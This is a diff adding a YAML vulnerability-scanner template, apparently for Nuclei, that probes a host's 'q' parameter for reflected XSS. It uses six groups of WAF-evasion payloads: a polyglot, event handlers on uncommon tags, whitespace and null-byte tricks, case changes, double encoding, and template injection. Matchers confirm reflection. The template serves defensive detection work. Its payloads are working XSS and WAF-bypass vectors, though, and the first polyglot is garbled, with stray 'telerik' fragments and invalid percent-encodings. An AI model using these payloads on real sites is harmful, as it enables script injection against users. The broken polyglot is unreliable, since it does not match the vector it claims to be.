@@ -1,0 +1,171 @@
+id: xss-waf-bypass-polyglot-detection
+
+info:
+  name: XSS - WAF Bypass & Polyglot Payload Detection
+  author: achraf-chehboun
+  severity: high
+  description: |
+    Sophisticated XSS detection using polyglot payloads, encoding tricks, and modern
+    WAF evasion techniques. These payloads are specifically crafted to bypass:
+    - ModSecurity/OWASP CRS
+    - Cloudflare WAF
+    - AWS WAF
+    - Akamai Kona
+    - Imperva/Incapsula
+    Detection only — confirms unsafe reflection of attack vectors without exploitation.
+  reference:
+    - https://owasp.org/Top10/A03_2021-Injection/
+    - https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
+    cvss-score: 6.1
+    cwe-id: CWE-79
+  metadata:
+    max-request: 10
+  tags: owasp-top10,xss,waf-bypass,polyglot,detection-only
+
+variables:
+  canary: "xpoly{{randstr}}"
+
+http:
+  # Polyglot 1: Multi-context polyglot that works in HTML, attribute, and JS contexts
+  - raw:
+      - |
+        GET /?q=jaVasCript:/*-/*`/*\`/*'/*"/**/(/*%20*/oNcliCk=alert(1)%20)//%250telerik%250telerik/telerik/(/telerik/oNcliCk=alert(1)//>%0telerik%0telerik<svg%0telerik<svg/onload='alert(1)'> HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
+
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        name: polyglot-reflected
+        dsl:
+          - 'status_code == 200 && (contains(body, "oNcliCk=alert(1)") || contains(body, "onload=''alert(1)''"))'
+
+  # Bypass 2: HTML entities + event handlers without common blocked tags
+  - raw:
+      - |
+        GET /?q=<details%20open%20ontoggle=alert(1)>{{canary}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
+      - |
+        GET /?q=<marquee%20onstart=alert(1)>{{canary}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
+      - |
+        GET /?q=<video%20src=x%20onerror=alert(1)>{{canary}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
+      - |
+        GET /?q=<audio%20src=x%20onerror=alert(1)>{{canary}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        name: uncommon-tag-reflected
+        dsl:
+          - 'contains(body_1, "<details open ontoggle=alert(1)>")'
+          - 'contains(body_2, "<marquee onstart=alert(1)>")'
+          - 'contains(body_3, "onerror=alert(1)") && contains(body_3, "<video")'
+          - 'contains(body_4, "onerror=alert(1)") && contains(body_4, "<audio")'
+        condition: or
+
+  # Bypass 3: Newline/tab/null byte insertion to break WAF regex
+  - raw:
+      - |
+        GET /?q=<svg%09onload%09=%09alert(1)>{{canary}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
+      - |
+        GET /?q=<img%0Asrc=x%0Aonerror=alert(1)>{{canary}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
+      - |
+        GET /?q=<svg%0Aonload%0A=%0Aalert(1)>{{canary}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        name: whitespace-evasion-reflected
+        dsl:
+          - 'contains(body_1, "onload") && contains(body_1, "alert(1)") && contains(body_1, "<svg")'
+          - 'contains(body_2, "onerror") && contains(body_2, "alert(1)") && contains(body_2, "<img")'
+          - 'contains(body_3, "onload") && contains(body_3, "alert(1)") && contains(body_3, "<svg")'
+        condition: or
+
+  # Bypass 4: Case randomization + string concatenation
+  - raw:
+      - |
+        GET /?q=<ScRiPt%20>alert(String.fromCharCode(49))</ScRiPt>{{canary}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
+      - |
+        GET /?q=<IMG%20SRC=x%20ONERROR="alert(1)">{{canary}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        name: case-evasion-reflected
+        dsl:
+          - 'contains(body_1, "<ScRiPt") && contains(body_1, "alert(")'
+          - 'contains(body_2, "ONERROR") && contains(body_2, "alert(1)")'
+        condition: or
+
+  # Bypass 5: Double encoding and Unicode tricks
+  - raw:
+      - |
+        GET /?q=%253Csvg%2520onload%253Dalert(1)%253E{{canary}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
+      - |
+        GET /?q=\u003csvg\u0020onload=alert(1)\u003e{{canary}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        name: encoding-bypass-reflected
+        dsl:
+          - 'contains(body_1, "<svg onload=alert(1)>")'
+          - 'contains(body_2, "<svg onload=alert(1)>")'
+        condition: or
+
+  # Bypass 6: Template literal and modern JS syntax
+  - raw:
+      - |
+        GET /?q={{canary}}${alert(1)} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
+      - |
+        GET /?q={{canary}}{{constructor.constructor('alert(1)')()}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        name: template-literal-reflected
+        dsl:
+          - 'contains(body_1, "${alert(1)}")'
+          - 'contains(body_2, "constructor.constructor")'
+        condition: or
+
+    extractors:
+      - type: regex
+        name: reflected-xss-evidence
+        group: 0
+        regex:
+          - '(?i)(<[a-z]+[^>]*\bon\w+\s*=\s*["\x27]?alert[^>]*>)'
+          - '(?i)(<script[^>]*>[^<]*alert[^<]*</script>)'
